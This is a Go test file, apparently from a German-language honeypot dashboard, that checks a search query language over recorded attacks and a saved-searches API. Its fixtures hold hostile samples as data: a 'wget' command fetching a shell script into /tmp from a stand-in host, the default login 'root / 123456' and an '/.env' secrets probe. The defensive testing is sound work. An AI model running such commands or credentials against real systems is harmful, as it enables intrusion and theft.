package main

import (
	"net/http/httptest"
	"strings"
	"testing"
)

func TestQueryLanguage(t *testing.T) {
	a := &Attack{IP: "203.0.113.5", Country: "CN", CountryName: "China", ASN: 4134, ASOrg: "Chinanet", Services: []string{"ssh"}, Ports: []int{22},
		Stufe: 3, Events: 40, Commands: []string{"cd /tmp; wget http://198.51.100.1/x.sh", `echo "$((535*316+18))"`}, Profile: "SSH-Einbruch",
		Tags: []Count{{Key: "download_exec", Label: "Nachladen und Ausführen"}}, creds: map[string]int{"root / 123456": 3}, paths: map[string]int{},
		seenCmd: map[string]bool{}, Wallets: []string{"4Ab3"}}
	b := &Attack{IP: "198.51.100.9", Country: "DE", Services: []string{"http"}, Ports: []int{80}, Stufe: 0, Scanner: "Censys",
		paths: map[string]int{"/.env": 1}, creds: map[string]int{}, seenCmd: map[string]bool{}}
	for _, c := range []struct {
		q    string
		a, b bool
	}{
		{"", true, true},
		{"service:ssh", true, false},
		{"stufe>=3", true, false},
		{"stufe:befehle", true, false},
		{"stufe<1 scanner:ja", false, true},
		{"country:cn", true, false},
		{"land:deutsch", false, false},
		{"cmd:*wget*", true, false},
		{"cmd:wget", true, false},
		{"-tag:nachladen", false, true},
		{"user:root pass:123456", true, false},
		{"port>1000", false, false},
		{"asn:4134", true, false},
		{"path:.env", false, true},
		{"wallet:4ab3", true, false},
		{`"$((535*316+18))"`, true, false}, // freier Text: * wörtlich
		{"root / 123456", true, false},     // Link von der Seite Zugangsdaten
		{"ip:203.0.113.*", true, false},
		{"unbekannt:feld", false, false}, // unbekanntes Feld = freier Text
	} {
		terms := parseQuery(c.q)
		if got := a.matchQuery(terms); got != c.a {
			t.Errorf("%q auf a: %v", c.q, got)
		}
		if got := b.matchQuery(terms); got != c.b {
			t.Errorf("%q auf b: %v", c.q, got)
		}
	}
}

func TestSavedSearches(t *testing.T) {
	h := testHive(t)
	call := func(method, path, body string) string {
		w := httptest.NewRecorder()
		r := httptest.NewRequest(method, path, strings.NewReader(body))
		if method == "DELETE" {
			r.SetPathValue("name", path[strings.LastIndex(path, "/")+1:])
		}
		h.searches(w, r)
		return w.Body.String()
	}
	call("POST", "/api/searches", `{"name":"Miner","q":"tag:miner"}`)
	if got := call("POST", "/api/searches", `{"name":"Einbrüche","q":"stufe>=3"}`); !strings.Contains(got, `"Einbrüche"`) || !strings.Contains(got, `"Miner"`) {
		t.Fatalf("Liste: %s", got)
	}
	if got := call("DELETE", "/api/searches/Miner", ""); strings.Contains(got, "Miner") {
		t.Errorf("gelöscht: %s", got)
	}
	if got := call("POST", "/api/searches", `{"name":"","q":"x"}`); !strings.Contains(got, "angeben") {
		t.Errorf("ohne Namen: %s", got)
	}
}
